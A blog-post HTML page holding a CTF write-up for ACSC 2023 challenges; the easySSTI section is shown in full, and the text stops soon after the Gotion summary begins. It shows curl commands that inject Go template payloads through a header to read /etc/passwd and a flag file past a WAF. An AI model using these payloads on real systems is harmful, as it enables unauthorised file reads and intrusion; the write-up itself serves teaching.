@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr" data-bs-theme="dark">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ACSC 2023 Quals (I): Gotion and easySSTI | Mystify</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300..700&family=Libre+Baskerville:ital,wght@0,400..700;1,400..700&family=Playfair+Display:ital,wght@0,400..900;1,400..900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.8/css/bootstrap.min.css"
+  integrity="sha512-2bBQCjcnw658Lho4nlXJcc6WkV/UxpE/sAokbXPxQNGqmNdQrWqtw26Ns9kFF/yG792pKR1Sx8/Y1Lf1XN4GKA==" crossorigin="anonymous"
+  referrerpolicy="no-referrer" />
+<link rel="stylesheet" href="/css/main.min.27b43d01a5c4432e35e87df4c1026d71d0e56b69b492a4e65a5564c213f27fa9.css" integrity="sha256-J7Q9AaXEQy416H30wQJtcdDla2m0kqTmWlVkwhPyf6k=" crossorigin="anonymous">
+<link rel="stylesheet" href="/css/prism.min.ebb6c0bd3fe6ed4e16ec09f3b52903ee18ddfb21e33b6882030d951a91b213e4.css" integrity="sha256-67bAvT/m7U4W7AnztSkD7hjd&#43;yHjO2iCAw2VGpGyE&#43;Q=" crossorigin="anonymous">
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.8/js/bootstrap.min.js"
+  integrity="sha512-nKXmKvJyiGQy343jatQlzDprflyB5c+tKCzGP3Uq67v+lmzfnZUi/ZT+fc6ITZfSC5HhaBKUIvr/nTLCV+7F+Q==" crossorigin="anonymous"
+  referrerpolicy="no-referrer"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
+  integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous"
+  referrerpolicy="no-referrer"></script>
+        <script src="/js/main.f2979a93a325fecf9605263bd141398a311c8e23388ed7dcff74f92f7e632866.js" integrity="sha256-8peak6Ml/s&#43;WBSY70UE5ijEcjiM4jtfc/3T5L35jKGY=" crossorigin="anonymous"></script>
+        <script src="/js/prism.0ecb34b0181efd0f9aa6d1a8fc2e4814ffbdd9acc78d93d02a94e01f64f87f35.js" integrity="sha256-Dss0sBge/Q&#43;aptGo/C5IFP&#43;92azHjZPQKpTgH2T4fzU=" crossorigin="anonymous"></script>
+
+
+
+</head>
+<body class="overflow-y-scroll">
+  <nav class="navbar navbar-expand-lg sticky-top bg-body-tertiary">
+  <div class="container">
+    <a class="navbar-brand" href="/">Mystify</a>
+
+    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+      <span class="navbar-toggler-icon"></span>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
+      <div class="navbar-nav">
+        
+        
+          <a class="nav-link " href="/about-me/">
+            About Me 
+          </a>
+        
+          <a class="nav-link " href="/blogroll/">
+            Blogroll 
+          </a>
+        
+          <a class="nav-link " href="/crypto-in-ctf/">
+            Crypto in CTF 
+          </a>
+        
+      </div>
+    </div>
+  </div>
+</nav>
+
+  <main>
+    <div class="container mt-3">
+      
+  <div class="row justify-content-center">
+    <div class="col-8">
+      <h1 class="post-title">ACSC 2023 Quals (I): Gotion and easySSTI</h1>
+
+      
+      <div class="text-muted pb-4">
+        
+          
+          
+          <time datetime="2023-03-29T00:50:00&#43;08:00">2023-03-29</time>
+        
+        
+        <span class="px-1">::</span>
+        
+        
+          <span class="badge rounded-pill bg-secondary">
+            <a href="https://mystiz.hk/tags/ctf/" class="text-muted text-decoration-none">#ctf</a>
+          </span>
+        
+          <span class="badge rounded-pill bg-secondary">
+            <a href="https://mystiz.hk/tags/acsc/" class="text-muted text-decoration-none">#acsc</a>
+          </span>
+        
+          <span class="badge rounded-pill bg-secondary">
+            <a href="https://mystiz.hk/tags/web/" class="text-muted text-decoration-none">#web</a>
+          </span>
+        
+      </div>
+      
+
+      <div class="post-content js-toc-content"><div>
+          <p>Asian Cyber Security Challenge (ACSC) is an annual CTF where players are competing individually, and the best young Asians will be selected form a team to represent Asia to compete with others. I ended up winning the competition among 450+ players. Unfortunately, I am unable to qualify because of the age and nationality conditions.</p>
+<p>In this blog post, I will cover two web challenges, <a href="https://twitter.com/t0nk42" target="_blank" rel="nofollow">@t0nk42</a>'s <em>easySSTI</em> (43 solves) and <a href="https://twitter.com/tyage" target="_blank" rel="nofollow">@tyage</a>'s <em>Gotion</em> (9 solves).</p>
+<h2 id="easyssti">easySSTI<a href="#easyssti" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="challenge-summary">Challenge Summary<a href="#challenge-summary" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>We are given a web app written with the <em>Echo</em> framework in <em>Golang</em>, which renders the content given a template string in the <code>Template</code> header. For instance, setting the <code>Template</code> header by <code>{{ .Request.RemoteAddr }}</code> would show <code>172.0.0.1:31337</code>.</p>
+<p>However, the application is served behind a firewall (WAF) that drops all the HTTP responses containing the flag format (i.e., <code>ACSC{.*}</code>).</p>
+<p>The goal is to read the flag.</p>
+<h3 id="solution">Solution<a href="#solution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h4 id="part-i-understanding-the-challenge">Part I: Understanding the challenge<a href="#part-i-understanding-the-challenge" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>To start with, we may want to understand why <code>{{ .Request.RemoteAddr }}</code> prints the IP address. The below code snippet is the <code>handleIndex</code> function, which handles <code>GET /</code>. I commented the function for ease of reading.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kd">func</span><span class="w"> </span><span class="nf">handleIndex</span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="nx">echo</span><span class="p">.</span><span class="nx">Context</span><span class="p">)</span><span class="w"> </span><span class="kt">error</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Reads the template. This either comes from the &#34;Template&#34; header user</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// supplied, or a default value otherwise. The value is defined by a</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// middleware which is not included here.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nx">tmpl</span><span class="p">,</span><span class="w"> </span><span class="nx">ok</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">c</span><span class="p">.</span><span class="nf">Get</span><span class="p">(</span><span class="s">&#34;template&#34;</span><span class="p">).([]</span><span class="kt">byte</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">!</span><span class="nx">ok</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">fmt</span><span class="p">.</span><span class="nf">Errorf</span><span class="p">(</span><span class="s">&#34;failed to get template&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nx">tmplStr</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nb">string</span><span class="p">(</span><span class="nx">tmpl</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// The `Parse` function converts a string into a template.Template instance.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Reference: https://pkg.go.dev/html/template#Template.Parse</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nx">t</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">template</span><span class="p">.</span><span class="nf">New</span><span class="p">(</span><span class="s">&#34;page&#34;</span><span class="p">).</span><span class="nf">Parse</span><span class="p">(</span><span class="nx">tmplStr</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">c</span><span class="p">.</span><span class="nf">String</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="p">.</span><span class="nf">Error</span><span class="p">())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nx">buf</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nb">new</span><span class="p">(</span><span class="nx">bytes</span><span class="p">.</span><span class="nx">Buffer</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// The `Execute` function applies the given template to the data object</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// (which is `c` in our case) and sets the results to `buf`.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Reference: https://pkg.go.dev/html/template#Template.Execute</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">t</span><span class="p">.</span><span class="nf">Execute</span><span class="p">(</span><span class="nx">buf</span><span class="p">,</span><span class="w"> </span><span class="nx">c</span><span class="p">);</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">c</span><span class="p">.</span><span class="nf">String</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="p">.</span><span class="nf">Error</span><span class="p">())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">c</span><span class="p">.</span><span class="nf">HTML</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusOK</span><span class="p">,</span><span class="w"> </span><span class="nx">buf</span><span class="p">.</span><span class="nf">String</span><span class="p">())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>Here <code>c</code> is an <a href="https://github.com/labstack/echo/blob/v4.10.0/context.go#L19-L198"
+   
+   target="_blank" rel="noopener noreferrer" ><code>echo.Context</code></a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
+    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
+</svg>, which is an interface with several methods. In the example, it uses the <code>Request()</code> method which returns a pointer of a <a href="https://cs.opensource.google/go/go/&#43;/refs/tags/go1.19:src/net/http/request.go;l=103-324"
+   
+   target="_blank" rel="noopener noreferrer" ><code>http.Request</code></a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
+    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
+</svg>. It has a field called <code>RemoteAddr</code>.</p>
+<p>In our example, we can imagine that <code>{{ .Request.RemoteAddr }}</code> behaves the same as evaluating <code>c.Request().RemoteAddr</code> and printing the results.</p>
+<h4 id="part-ii-an-invalid-trivial-solution">Part II: An invalid trivial solution<a href="#part-ii-an-invalid-trivial-solution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>There is a <code>File</code> function from <code>echo.Context</code> that allows us to read an arbitrary file. For instance, we can access the content of <code>/etc/passwd</code> with the template being <code>{{ .File &quot;/etc/passwd&quot; }}</code>:</p>
+<pre class='language-bash command-line' data-output='2-20' data-user='mystiz' data-host='fixa'>
+<code class="language-bash">curl &#39;http://localhost:8000/&#39; -H &#39;template: {{ .File &#34;/etc/passwd&#34; }}&#39; 
+root:​x:0:0:root:/root:/bin/bash
+daemon:​x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:​x:2:2:bin:/bin:/usr/sbin/nologin
+sys:​x:3:3:sys:/dev:/usr/sbin/nologin
+sync:​x:4:65534:sync:/bin:/bin/sync
+games:​x:5:60:games:/usr/games:/usr/sbin/nologin
+man:​x:6:12:​man:/var/cache/man:/usr/sbin/nologin
+lp:​x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:​x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:​x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:​x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:​x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:​x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:​x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:​x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:​x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:​x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:​x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:​x:​100:65534::/nonexistent:/usr/sbin/nologin</code>
+</pre>
+
+<p>Of course, we cannot read <code>/flag</code> because it is blocked by the firewall:</p>
+<pre class='language-bash command-line' data-output='2' data-user='mystiz' data-host='fixa'>
+<code class="language-bash">curl &#39;http://localhost:8000/&#39; -H &#39;template: {{ .File &#34;/flag&#34; }}&#39; 
+??</code>
+</pre>
+
+<p>Unfortunately, the <code>File</code> function does not return the file content as a string. The content is instead served directly (see lines <a href="https://github.com/labstack/echo/blob/v4.10.0/context_fs.go#L11-L13"
+   
+   target="_blank" rel="noopener noreferrer" >11-13</a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
+    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
+</svg> and <a href="https://github.com/labstack/echo/blob/v4.10.0/context_fs.go#L24-L49"
+   
+   target="_blank" rel="noopener noreferrer" >24-49</a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
+    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
+</svg> of <code>context_fs.go</code>). Thus we cannot manipulate the output via variables (or pipelines) like below:</p>
+<pre class='language-bash command-line' data-output='3' data-user='mystiz' data-host='fixa'>
+<code class="language-bash">curl &#39;http://localhost:8000/&#39; \
+    -H &#39;template: {{ with $x := &#34;ACSC{this_is_a_test_flag}&#34; }}{{ slice $x 1 }}{{ end }}&#39;
+CSC{this_is_a_test_flag}</code>
+</pre>
+
+<h4 id="part-iii-embedding-or-golangs-inheritance">Part III: Embedding, or Golang's inheritance<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup><a href="#part-iii-embedding-or-golangs-inheritance" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>We can get an instance of the <a href="https://github.com/labstack/echo/blob/v4.10.0/echo.go#L68-L106"
+   
+   target="_blank" rel="noopener noreferrer" ><code>echo.Echo</code></a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
+    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
+</svg> struct by accessing <code>{{ .Echo }}</code>. Note that it embeds two structs, <a href="https://github.com/labstack/echo/blob/v4.10.0/echo_fs.go#L13-L21"
+   
+   target="_blank" rel="noopener noreferrer" ><code>echo.filesystem</code></a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
+    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
+</svg> and <code>echo.common</code>. Therefore we have access to their methods and attributes. In particular, we have the <code>Filesystem</code> instance (which is a <a href="https://pkg.go.dev/io/fs#FS"
+   
+   target="_blank" rel="noopener noreferrer" ><code>fs.FS</code></a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
+    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
+</svg>). Now we can open a file with the <code>Open</code> method provided:</p>
+<pre class='language-bash command-line' data-output='3' data-user='mystiz' data-host='fixa'>
+<code class="language-bash">curl &#39;http://localhost:8000/&#39; \
+    -H &#39;template: {{ .Echo.Filesystem.Open &#34;/etc/passwd&#34; }}&#39;
+{0xc0001a1bc0}</code>
+</pre>
+
+<p>The <code>{0xc0001a1bc0}</code> returned is actually a <a href="https://pkg.go.dev/io/fs#File"
+   
+   target="_blank" rel="noopener noreferrer" ><code>fs.File</code></a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
+    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
+</svg>, which has a <code>Read</code> function. The signature of the function is <code>Read([]byte) (int, error)</code>, and we need to give it an <code>[]byte</code> to overwrite. Fortunately, the template itself is a <code>[]byte</code>, and we can access it with <code>{{ .Get &quot;template&quot; }}</code>.</p>
+<p>Chaining it together, we can read the flag -- <code>ACSC{h0w_did_y0u_leak_me}</code>:</p>
+<pre class='language-bash command-line' data-output='3' data-user='mystiz' data-host='fixa'>
+<code class="language-bash">curl &#39;http://localhost:8000/&#39; \
+    -H &#39;template: {{ $y := .Get &#34;template&#34; }}{{ $x := .Echo.Filesystem.Open &#34;/flag&#34; }}{{ $z := $x.Read $y }}{{ $y }}&#39;
+[65 67 83 67 123 104 48 119 95 100 105 100 95 121 48 117 95 108 101 97 107 95 109 101 125 10 125 123 123 32 36 120 32 58 61 32 46 69 99 104 111 46 70 105 108 101 115 121 115 116 101 109 46 79 112 101 110 32 34 47 102 108 97 103 34 32 125 125 123 123 32 36 122 32 58 61 32 36 120 46 82 101 97 100 32 36 121 32 125 125 123 123 32 36 121 32 125 125]</code>
+</pre>
+
+<p>There are four actions in the above template:</p>
+<ol>
+<li><code>{{ $y := .Get &quot;template&quot; }}</code> reads the template and assigns it to <code>$y</code>,</li>
+<li><code>{{ $x := .Echo.FileSystem.Open &quot;/flag&quot; }}</code> opens <code>/flag</code> and assigns the instance of <a href="https://pkg.go.dev/io/fs#File"
+   
+   target="_blank" rel="noopener noreferrer" ><code>fs.File</code></a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
+    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
+</svg> to <code>$x</code>,</li>
+<li><code>{{ $z := $x.Read $y }}</code> reads the content of <code>/flag</code> and writes to <code>$y</code>, and</li>
+<li><code>{{ $y }}</code> prints the value of <code>$y</code>, where the flag is overwritten.</li>
+</ol>
+<div class="alert info">
+  🐣 <strong>Why <code>$z := $x.Read $y</code>?</strong> Here <code>$z := </code> is used to surpress the return value of <code>Read($y)</code> to be printed. In this case, it would be an integer.
+</div>
+
+<h2 id="gotion">Gotion<a href="#gotion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="challenge-summary-1">Challenge Summary<a href="#challenge-summary-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>We are given another web app written in <em>Golang</em> implementing a note system. We are allowed to create and update notes. The content (including both the title and the body) will be handled by the <code>html/template</code> package to avoid injections like XSS. Additionally, the web app is served behind <em>nginx</em> with a smart caching feature, which caches <code>.mp4</code> files.</p>
+<p>The goal is to create a XSS to steal the admin's cookie.</p>
